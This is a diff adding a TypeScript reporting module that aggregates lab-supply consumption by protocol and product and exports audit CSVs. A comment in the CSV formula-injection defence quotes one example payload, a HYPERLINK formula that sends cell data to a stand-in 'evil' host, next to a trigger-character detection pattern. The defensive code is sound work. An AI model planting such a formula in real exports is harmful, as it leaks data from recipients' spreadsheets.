@@ -1,0 +1,361 @@
+import { TAIWAN_TIMEZONE } from '@/lib/utils'
+import type { ProtocolConsumptionReport } from '@/types/report'
+
+/**
+ * 案件消耗報表的三種聚合軸。
+ *
+ * 後端回的是最細顆粒度（一列 = 一個案件 × 一個品項），三個分頁都由這裡轉出來，
+ * 不各自打一次 API——同一份資料換三種看法，多打兩次只會讓三個分頁有機會不一致。
+ *
+ * 🔴 **案件彙總刻意沒有「數量合計」**。一個案件會用到手套（雙）、滴管（包）、
+ * 紗布（片），把它們的 `qty_base` 加起來得到的數字沒有任何意義。金額可以加，
+ * 數量不行。要看數量請展開到品項那一層，或用交叉表。
+ */
+
+/**
+ * 後端的取用上限。後端實際取 `LIMIT 1001`，多的那一筆是截斷訊號：
+ * 拿到超過這個數量就代表**確定還有更多**，等於這個數量則是**確定剛好取完**。
+ * 用 `length >= LIMIT` 判斷會把後者誤報成前者。
+ */
+export const ROW_LIMIT = 1000
+
+/**
+ * 交叉表允許渲染／匯出的格數上限（列 × 行，**含沒有值的空格**）。
+ *
+ * 🔴 **`ROW_LIMIT` 擋不住這件事。** 它限的是扁平列數（一列＝一個案件 × 一個品項），
+ * 而交叉表的格數是「相異案件數 × 相異品項數」。1000 列的最壞情況是 1000 個不同案件
+ * 各配 1 個不同品項（對角線分佈）——`protocols` 與 `products` 各自逼近 1000，
+ * 交叉表就是 **1000 × 1000 ＝ 一百萬格**，其中只有 1000 格有值。React 會為此建出
+ * 一百萬個 DOM 節點，`crossTabCsv` 會組出一百萬個欄位的字串，兩者都足以卡死主執行緒
+ * 或吃光瀏覽器記憶體。
+ *
+ * ⚠️ **虛擬捲動解決不了匯出那一半。** 即使表格只渲染可視範圍，CSV 仍是一次全量產生，
+ * 所以這個上限必須是**渲染與匯出共用**的判準，不能只做在表格那一側。
+ *
+ * （CodeRabbit 於 MR !15 指出，2026-09-11。實查 `services/report.rs:561` 的
+ * `LIMIT 1001` 確認它限的是扁平列數，故該推論成立。）
+ */
+export const MAX_CROSS_CELLS = 100_000
+
+export interface LoadedRows {
+  rows: ProtocolConsumptionReport[]
+  truncated: boolean
+}
+
+/** 切掉截斷訊號用的那一筆，並回報是否真的被截斷。 */
+export function splitTruncationSignal(raw: ProtocolConsumptionReport[]): LoadedRows {
+  return raw.length > ROW_LIMIT
+    ? { rows: raw.slice(0, ROW_LIMIT), truncated: true }
+    : { rows: raw, truncated: false }
+}
+
+/**
+ * 檔名用的日期戳（`YYYY-MM-DD`，台灣時間）。
+ *
+ * 不能用 `toISOString().split('T')[0]`——那是 UTC，台灣時間 00:00–07:59 之間
+ * 匯出的檔名會標成前一天。`en-CA` 這個 locale 的短日期格式剛好就是 `YYYY-MM-DD`，
+ * 是取得固定格式又能指定時區的標準做法（`formatDate` 走 `uiLocale()`，
+ * 格式隨語系變動，不能拿來組檔名）。
+ */
+export function taipeiDateStamp(now: Date = new Date()): string {
+  return now.toLocaleDateString('en-CA', { timeZone: TAIWAN_TIMEZONE })
+}
+
+/** `Decimal` 序列化成字串，空值當 0。 */
+export function toNum(v: string | null | undefined): number {
+  if (v === null || v === undefined || v === '') return 0
+  const n = Number(v)
+  return Number.isFinite(n) ? n : 0
+}
+
+/**
+ * 把加總結果收斂回 4 位小數，消除浮點累加的尾數雜訊。
+ *
+ * 後端兩個數值欄位都是 `numeric(18,4)`（002_schema.sql:5252-5253），**來源只有
+ * 4 位小數**。用 IEEE-754 累加會冒出 `1234.5678000000001` 這種尾巴——畫面上被
+ * `formatNumber(v, 2)` 蓋掉看不出來，但 **CSV 寫的是原始數字**，那份檔案是要
+ * 寄給稽核的。
+ *
+ * 為什麼不引進 decimal.js 之類的精確十進位套件（審查建議的做法）：
+ *
+ * 1. 新增依賴在本專案是 §必問 的事，不是實作者能自己決定的。
+ * 2. 這裡不需要。float64 的精確整數範圍是 2^53 ≈ 9×10^15，換算成 4 位小數是
+ *    約 9×10^11；本報表的量級（數千筆 × 萬元級）離它有五個數量級以上。
+ *    在這個範圍內，「浮點累加後捨入到 4 位」與「精確十進位加總」結果相同。
+ * 3. 真正需要精確十進位的是**寫入端**（下單、扣帳），那些全部在後端用
+ *    `rust_decimal` 處理，本模組只做唯讀呈現。
+ *
+ * ⚠️ 若日後量級成長到接近 9×10^11，這個假設就不成立了，屆時要改用精確型別。
+ */
+export function round4(n: number): number {
+  return Math.round(n * 1e4) / 1e4
+}
+
+/** 一個案件的彙總（跨品項）。注意沒有數量欄位，理由見檔頭。 */
+export interface ProtocolTotal {
+  protocol_id: string
+  protocol_no: string
+  iacuc_no: string | null
+  protocol_title: string | null
+  /** 這個案件動用過幾種品項 */
+  product_count: number
+  /** 貢獻的單據張數（跨品項去重） */
+  doc_count: number
+  total_cost: number
+  first_trx_date: string
+  last_trx_date: string
+}
+
+/** 一個品項的彙總（跨案件）。同一品項單位相同，數量可以加。 */
+export interface ProductTotal {
+  product_id: string
+  product_sku: string
+  product_name: string
+  category_name: string | null
+  base_uom: string
+  /** 被幾個案件用過 */
+  protocol_count: number
+  qty_base: number
+  total_cost: number
+}
+
+/** 交叉表：列＝案件、行＝品項。 */
+export interface CrossTab {
+  protocols: Array<Pick<ProtocolTotal, 'protocol_id' | 'protocol_no' | 'iacuc_no' | 'protocol_title'>>
+  products: Array<Pick<ProductTotal, 'product_id' | 'product_sku' | 'product_name' | 'base_uom'>>
+  /** 稀疏儲存：沒消耗過的組合不建 key，讀取端自行當 0。 */
+  cells: Map<string, number>
+}
+
+/**
+ * 交叉表的 cell key。
+ *
+ * 分隔字元是 NUL（\u0000），**寫成跳脫序列而不是字面字元**。UUID 不可能含 NUL，
+ * 所以兩段 id 怎麼組合都不會撞 key；但字面的 NUL 會讓 git 把整個 .ts 判成二進位檔
+ * （diff 渲染不出來、審查工具可能整份跳過），而且在編輯器裡完全看不見。
+ * 這個檔案先前就是這樣，2026-09-05 修正。
+ */
+export function cellKey(protocolId: string, productId: string): string {
+  return `${protocolId}\u0000${productId}`
+}
+
+/**
+ * `doc_count` 是後端**依案件 × 品項**算出來的，跨品項相加會把同一張領用單
+ * 重複計數（一張單常常同時領好幾種東西）。這裡取最大值當下界，
+ * 明確標示為「至少幾張」而不是精確值——要精確得由後端另開一支查詢。
+ */
+function docCountLowerBound(rows: ProtocolConsumptionReport[]): number {
+  return rows.reduce((max, r) => Math.max(max, r.doc_count), 0)
+}
+
+export function aggregateByProtocol(rows: ProtocolConsumptionReport[]): ProtocolTotal[] {
+  const grouped = new Map<string, ProtocolConsumptionReport[]>()
+  for (const row of rows) {
+    const bucket = grouped.get(row.protocol_id)
+    if (bucket) bucket.push(row)
+    else grouped.set(row.protocol_id, [row])
+  }
+
+  return [...grouped.values()]
+    .map(group => {
+      const head = group[0]
+      return {
+        protocol_id: head.protocol_id,
+        protocol_no: head.protocol_no,
+        iacuc_no: head.iacuc_no,
+        protocol_title: head.protocol_title,
+        product_count: group.length,
+        doc_count: docCountLowerBound(group),
+        total_cost: round4(group.reduce((sum, r) => sum + toNum(r.total_cost), 0)),
+        first_trx_date: group.reduce(
+          (min, r) => (r.first_trx_date < min ? r.first_trx_date : min),
+          head.first_trx_date
+        ),
+        last_trx_date: group.reduce(
+          (max, r) => (r.last_trx_date > max ? r.last_trx_date : max),
+          head.last_trx_date
+        ),
+      }
+    })
+    .sort((a, b) => a.protocol_no.localeCompare(b.protocol_no))
+}
+
+export function aggregateByProduct(rows: ProtocolConsumptionReport[]): ProductTotal[] {
+  const grouped = new Map<string, ProtocolConsumptionReport[]>()
+  for (const row of rows) {
+    const bucket = grouped.get(row.product_id)
+    if (bucket) bucket.push(row)
+    else grouped.set(row.product_id, [row])
+  }
+
+  return [...grouped.values()]
+    .map(group => {
+      const head = group[0]
+      return {
+        product_id: head.product_id,
+        product_sku: head.product_sku,
+        product_name: head.product_name,
+        category_name: head.category_name,
+        base_uom: head.base_uom,
+        protocol_count: new Set(group.map(r => r.protocol_id)).size,
+        qty_base: round4(group.reduce((sum, r) => sum + toNum(r.qty_base), 0)),
+        total_cost: round4(group.reduce((sum, r) => sum + toNum(r.total_cost), 0)),
+      }
+    })
+    .sort((a, b) => a.product_sku.localeCompare(b.product_sku))
+}
+
+export function buildCrossTab(rows: ProtocolConsumptionReport[]): CrossTab {
+  const cells = new Map<string, number>()
+  for (const row of rows) {
+    const key = cellKey(row.protocol_id, row.product_id)
+    cells.set(key, (cells.get(key) ?? 0) + toNum(row.qty_base))
+  }
+  // 累加完再一次收斂，避免逐步捨入
+  for (const [k, v] of cells) cells.set(k, round4(v))
+
+  return {
+    protocols: aggregateByProtocol(rows).map(p => ({
+      protocol_id: p.protocol_id,
+      protocol_no: p.protocol_no,
+      iacuc_no: p.iacuc_no,
+      protocol_title: p.protocol_title,
+    })),
+    products: aggregateByProduct(rows).map(p => ({
+      product_id: p.product_id,
+      product_sku: p.product_sku,
+      product_name: p.product_name,
+      base_uom: p.base_uom,
+    })),
+    cells,
+  }
+}
+
+/** 交叉表的總格數（列 × 行，含沒有值的空格）。見 `MAX_CROSS_CELLS`。 */
+export function crossTabCellCount(tab: CrossTab): number {
+  return tab.protocols.length * tab.products.length
+}
+
+/**
+ * 交叉表是否超過可渲染／可匯出的規模。
+ *
+ * **呼叫端要在兩處都先問過這個**：渲染表格之前，以及啟用匯出按鈕之前。
+ * 只做其中一處等於沒做——見 `MAX_CROSS_CELLS` 的說明。
+ */
+export function crossTabTooLarge(tab: CrossTab): boolean {
+  return crossTabCellCount(tab) > MAX_CROSS_CELLS
+}
+
+/**
+ * 交叉表的 CSV 內容（表頭 + 資料列）。
+ *
+ * 🔴 **沒有消耗紀錄的格輸出空字串，不是 0。** 畫面上那格顯示「—」，與「領用後
+ * 整筆沖銷」（淨額 0，根本不會進報表）是不同的兩件事；匯出成 `0` 等於把
+ * 「沒有這筆紀錄」講成「量測到的結果是零」，下游拿去算平均或加總都會被汙染。
+ *
+ * `uomLabel` 由呼叫端傳入，因為單位的顯示轉換屬於 UI 層（`formatUom`），
+ * 這個模組刻意保持不依賴 UI 工具。
+ *
+ * @throws 交叉表超過 `MAX_CROSS_CELLS` 時。這是**最後一道防線不是主要守門**——
+ * 呼叫端應該先用 `crossTabTooLarge()` 停用匯出按鈕。走到這裡代表那道檢查被繞過了，
+ * 此時寧可丟一個看得見的錯，也不要讓瀏覽器在組字串的過程中無聲失去回應。
+ */
+export function crossTabCsv(tab: CrossTab, uomLabel: (uom: string) => string): string {
+  if (crossTabTooLarge(tab)) {
+    throw new Error(
+      `交叉表有 ${crossTabCellCount(tab)} 格（${tab.protocols.length} 案件 × ` +
+        `${tab.products.length} 品項），超過 ${MAX_CROSS_CELLS} 的匯出上限。請縮小日期範圍後重試。`
+    )
+  }
+  return toCsv(
+    // 🔴 表頭必須帶 `product_sku`。`products` 只保證 **sku** 唯一，
+    // `(product_name, base_uom)` 沒有這個保證——同名同單位的兩個 `product_id`
+    // 會產生一模一樣的表頭，而 `buildCrossTab` 仍然輸出兩個獨立欄位，
+    // 下游拿到 CSV 無法判斷哪一欄是哪個品項。
+    // （CodeRabbit 於 MR !15 指出，2026-09-11。）
+    [
+      '計畫編號',
+      ...tab.products.map(p => `${p.product_sku} ${p.product_name}(${uomLabel(p.base_uom)})`),
+    ],
+    tab.protocols.map(pr => [
+      pr.protocol_no,
+      ...tab.products.map(pd => {
+        const qty = tab.cells.get(cellKey(pr.protocol_id, pd.product_id))
+        return qty === undefined ? '' : qty
+      }),
+    ])
+  )
+}
+
+/**
+ * 匯出檔名。
+ *
+ * 🔴 資料被截斷時檔名要帶 `_partial`。畫面上有黃色警示框說明殘缺，但**警示框不會
+ * 跟著 CSV 走**——檔案一旦寄給稽核或存檔，「這只是前 1000 組」這件事就無聲消失了。
+ * 檔名是唯一會跟著檔案一起移動的載體。
+ *
+ * 不在 CSV 內容裡加警告列：那會破壞欄位對齊，下游程式解析時反而更糟。
+ */
+export function exportFilename(kind: string, stamp: string, truncated: boolean): string {
+  return `protocol_consumption_${kind}${truncated ? '_partial' : ''}_${stamp}.csv`
+}
+
+/** RFC 4180 §2.1：record 之間以 CRLF 分隔，不是 LF。 */
+const CRLF = '\r\n'
+
+/**
+ * 組 CSV 內容（不含 BOM 與下載動作，那是頁面的事）。
+ *
+ * 兩處都照 RFC 4180：
+ *
+ * - **每格用雙引號包住，內含的雙引號 escape 成兩個**（§2.7）。品名裡出現 `"`
+ *   是真的會發生的（實查有品項叫 `"太平洋" 10號導尿管`），不 escape 的話
+ *   那一列的欄位會整個錯位。
+ * - **record 之間用 CRLF**（§2.1）。用 `\n` 的話註解宣稱的 RFC 4180 就是假的，
+ *   而且部分試算表與匯入工具只認 CRLF。
+ */
+/**
+ * 會被試算表當成公式起頭的字元。
+ *
+ * `-` 也在內：`-1+1` 這種看起來像負數的東西，Excel 一樣當公式算。
+ * Tab、CR、LF 本身也是觸發字元（某些解析器據此換欄／換列）。
+ * ⚠️ CR 與 LF 必須成對放在這個集合裡——換列的字元是這兩個，只擋一個等於沒擋。
+ */
+const FORMULA_TRIGGERS = /^[=+\-@\t\r\n]/
+
+/**
+ * 阻擋 CSV 公式注入（OWASP: CSV Injection / Formula Injection）。
+ *
+ * 🔴 **RFC 4180 的引號跳脫擋不住這件事。** 引號只保證欄位不會被切錯；
+ * Excel／LibreOffice 開檔時會先剝掉引號，再看到 `=`、`+`、`-`、`@` 開頭就當公式執行。
+ *
+ * 這支報表的風險是實的，不是理論：`product_name`、`product_sku`、`protocol_title`
+ * 都由建檔的人自由輸入，而這份 CSV 的設計用途正是**寄給 IACUC 稽核用 Excel 開啟**。
+ * 有人把品項命名成 `=HYPERLINK("http://evil/?"&A1,"click")`，收件者一開就中。
+ *
+ * 緩解方式是前面加一個單引號讓試算表當純文字。前置空白不能當免死金牌——
+ * Excel 會忽略它再解讀後面的內容，所以要跳過空白之後再判斷一次。
+ *
+ * ⚠️ 「空白」要取最寬的定義，不能只有半形空格與 NBSP：`\n=1+1` 這種值原本
+ * 兩道檢查都躲得過（LF 不在觸發集合裡，剝除也不處理 LF）。這裡改用 `\s`。
+ * `\s` 在 JS 已經包含 NBSP，仍明寫 `\u00a0` 是因為多數語言的 `\s` 不含它，
+ * 寫出來免得日後被當成贅字「簡化」掉。
+ *
+ * ⚠️ 只處理字串。數值欄位維持數值型別，否則負數金額會被前置引號變成文字，
+ * 下游拿去加總就壞了。
+ */
+export function neutralizeFormula(cell: string): string {
+  const withoutLeadingWhitespace = cell.replace(/^[\s\u00a0]+/, '')
+  if (FORMULA_TRIGGERS.test(cell) || FORMULA_TRIGGERS.test(withoutLeadingWhitespace)) {
+    return `'${cell}`
+  }
+  return cell
+}
+
+export function toCsv(headers: string[], rows: Array<Array<string | number>>): string {
+  const quote = (cell: string | number) => {
+    const safe = typeof cell === 'string' ? neutralizeFormula(cell) : String(cell)
+    return `"${safe.replace(/"/g, '""')}"`
+  }
+  return [headers, ...rows].map(row => row.map(quote).join(',')).join(CRLF)
+}
